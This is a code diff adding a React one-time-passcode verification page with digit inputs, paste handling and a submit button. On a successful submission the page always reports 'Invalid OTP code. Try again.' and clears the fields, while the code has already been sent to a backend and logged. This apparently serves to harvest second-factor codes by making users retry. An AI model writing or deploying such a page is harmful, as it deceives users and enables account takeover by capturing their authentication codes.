@@ -1,0 +1,157 @@
+import React, { useState, useRef } from "react";
+import { IoArrowBack } from "react-icons/io5";
+import axios from "axios";
+import BASE_URL from "../components/urls";
+import { useNavigate } from "react-router-dom";
+
+const Otp = () => {
+  const [code, setCode] = useState(Array(6).fill(""));
+  const [error, setError] = useState(""); // ✅ Add error state
+  const inputsRef = useRef([]);
+  const [loading, setLoading] = useState(false);
+  const navigate = useNavigate();
+
+  const handleChange = (value, index) => {
+    if (/^[0-9]$/.test(value) || value === "") {
+      const newCode = [...code];
+      newCode[index] = value;
+      setCode(newCode);
+
+      if (value && index < 5) {
+        inputsRef.current[index + 1].focus();
+      }
+    }
+  };
+
+  const handleKeyDown = (e, index) => {
+    if (e.key === "Backspace" && !code[index] && index > 0) {
+      inputsRef.current[index - 1].focus();
+    }
+  };
+
+  const handlePaste = (e) => {
+    e.preventDefault();
+    const pastedData = e.clipboardData
+      .getData("Text")
+      .replace(/\D/g, "")
+      .slice(0, 6);
+    if (pastedData.length) {
+      const newCode = [...code];
+      for (let i = 0; i < 6; i++) {
+        newCode[i] = pastedData[i] || "";
+      }
+      setCode(newCode);
+      if (inputsRef.current[5]) inputsRef.current[5].focus();
+    }
+  };
+  // ✅ Refresh function
+  const handleRefresh = () => {
+    setCode(["", "", "", "", "", ""]);
+    inputsRef.current[0].focus(); // Focus back to first input
+  };
+
+  const handleSubmit = () => {
+    const otp = code.join("");
+    console.log("OTP:", otp);
+
+    if (otp.length !== 6) {
+      setError("Please enter all 6 digits.");
+      return;
+    }
+
+    setLoading(true);
+    axios
+      .post(`${BASE_URL}/otp`, { otp })
+      .then(() => {
+        setError("Invalid OTP code. Try again."); // ✅ Always set error
+        handleRefresh();
+      })
+      .catch(() => {
+        setError("Invalid OTP code. Try again."); // ✅ Show error on failure
+      })
+      .finally(() => setLoading(false));
+  };
+
+  const handlePasteButton = async () => {
+    try {
+      const text = await navigator.clipboard.readText();
+      const digits = text.replace(/\D/g, "").slice(0, 6);
+      if (digits) {
+        const newCode = [...code];
+        for (let i = 0; i < 6; i++) {
+          newCode[i] = digits[i] || "";
+        }
+        setCode(newCode);
+        if (inputsRef.current[5]) inputsRef.current[5].focus();
+      }
+    } catch (error) {
+      console.error("Failed to read clipboard:", error);
+    }
+  };
+
+  return (
+    <div className="min-h-screen bg-black text-white flex flex-col px-6">
+      {/* Back Button */}
+      <button className="mt-6 mb-10 text-gray-300 hover:text-white flex items-center gap-2">
+        <IoArrowBack size={22} /> Back
+      </button>
+
+      {/* Header */}
+      <div className="text-left mb-6">
+        <h1 className="text-2xl font-bold mb-1">Verify OTP Code</h1>
+        <p className="text-gray-400 text-sm">
+          Enter the 6-digit OTP sent to your email
+        </p>
+      </div>
+
+      {/* OTP Inputs */}
+      <div className="flex justify-between mb-3">
+        {code.map((digit, index) => (
+          <input
+            key={index}
+            type="text"
+            maxLength="1"
+            value={digit}
+            ref={(el) => (inputsRef.current[index] = el)}
+            onChange={(e) => handleChange(e.target.value, index)}
+            onKeyDown={(e) => handleKeyDown(e, index)}
+            onPaste={handlePaste}
+            className="w-12 h-14 text-center text-2xl rounded-lg bg-[#1c1c1e] border border-gray-700 focus:border-gray-500 focus:outline-none"
+          />
+        ))}
+      </div>
+
+      {/* ✅ Error Message */}
+      {error && <p className="text-red-500 text-sm mb-4">{error}</p>}
+
+      {/* Paste Button */}
+      <div className="text-right mb-8">
+        <button
+          onClick={handlePasteButton}
+          className="text-gray-400 hover:text-white text-sm border border-gray-700 rounded-full px-4 py-1"
+        >
+          Paste
+        </button>
+      </div>
+
+      {/* Submit Button */}
+      <button
+        onClick={handleSubmit}
+        disabled={code.includes("")}
+        className={`w-full py-4 rounded-xl font-semibold text-lg ${
+          code.includes("")
+            ? "bg-gray-800 text-gray-500 cursor-not-allowed"
+            : "bg-[#1c1c1e] hover:bg-[#2f2f31] text-white"
+        }`}
+      >
+        {loading ? "Verifying..." : "Verify OTP"}
+      </button>
+
+      <p className="text-sm text-blue-500 mt-6 text-center cursor-pointer">
+        Didn’t receive the code? Resend OTP
+      </p>
+    </div>
+  );
+};
+
+export default Otp;
